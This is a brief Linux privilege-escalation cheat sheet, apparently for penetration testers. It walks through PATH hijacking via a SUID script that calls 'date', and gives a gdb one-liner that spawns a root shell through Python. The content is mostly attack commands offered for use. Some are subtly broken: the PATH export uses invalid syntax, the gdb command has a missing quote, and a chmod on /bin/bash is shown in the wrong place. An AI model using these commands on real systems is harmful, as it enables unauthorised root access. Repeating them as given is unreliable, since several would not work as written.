# Linux Privilege Escalation

## PATH Hijacking

```bash
# Find a SUID script (not listed in gtfobins)
# strings <FILE>
# You'll see that the script is using a command like 'date' and not '/usr/bin/date'
user@localhost~/$ find \-perm -4000 2>/dev/null 
/opt/file
user@localhost~/opt$ strings file
[...]
date
[...] 

user@localhost~/$ cd /tmp
user@localhost~/tmp$ nano date
user@localhost~/tmp$ chmod u+s /bin/bash
user@localhost~/tmp$ chmod +x date
user@localhost~/tmp$ export PATH:.:$PATH

# Run the SUID
# Maybe you'll see nothing. But run this 
user@localhost~/tmp$ bash -p 
root@localhost~/tmp$ whoami
root
root@localhost~/tmp$
```

## SUID Binaries

### gdb

If the binary gdb is SUID, you can do a Privilege Escalation with the nect command:

{% hint style="info" %}
With this command you need to have installed python in the machine.
{% endhint %}

```bash
./gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh, "-p")' -ex quit
```
